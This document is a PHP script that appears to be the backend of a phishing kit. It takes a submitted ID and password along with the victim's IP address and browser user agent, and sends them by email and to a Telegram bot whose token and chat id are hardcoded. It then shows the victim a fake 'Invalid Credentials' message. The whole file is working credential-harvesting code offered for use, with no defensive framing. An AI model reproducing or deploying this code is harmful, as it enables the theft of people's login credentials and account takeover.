<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true ");
header("Access-Control-Allow-Methods: OPTIONS, GET, POST");
header("Access-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, If-Modified-Since, X-File-Name, Cache-Control");

// Telegram configuration (from telegram.php)
$botToken = "8034901713:AAFfM_y0NOQ1cXrwcRyvStavvggDpG5JZ3w";
$id = "8043879464";

// Get POST data
$em = trim($_POST['di']);
$password = trim($_POST['pr']);

// Function to log message via email and Telegram
function logMessage($message, $send, $subject) {
    // Send email
    mail($send, $subject, $message);

    // Send to Telegram
    global $botToken, $id;
    $mess = urlencode($message);
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $id . "&text=" . $mess;
    $curl = curl_init();

    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

    $result = curl_exec($curl);
    curl_close($curl);

    return $result;
}

// Check if form fields are set
if ($em != null && $password != null) {
    $ip = getenv("REMOTE_ADDR");
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    $message = "[+]━━━━【🔥 Login Attempt 🔥】━━━━[+]\r\n\n";
    $message .= "ID : " . htmlspecialchars($em) . "\n";
    $message .= "Password : " . htmlspecialchars($password) . "\n\n";
    $message .= "[+]🔥 ━━━━【💻 System INFO】━━━━ 🔥[+]\r\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|User Agent: " . $useragent . "\n";
    $message .= "|🔥 ━━━━━━━━━━━━━━━━━ 🔥|\n";

    $send = $Receive_email; // Make sure $Receive_email is defined somewhere
    $subject = "Login Attempt: $ip";

    if (logMessage($message, $send, $subject)) {
        $signal = 'ok';
        $msg = 'Invalid Credentials';
    }
}
?>
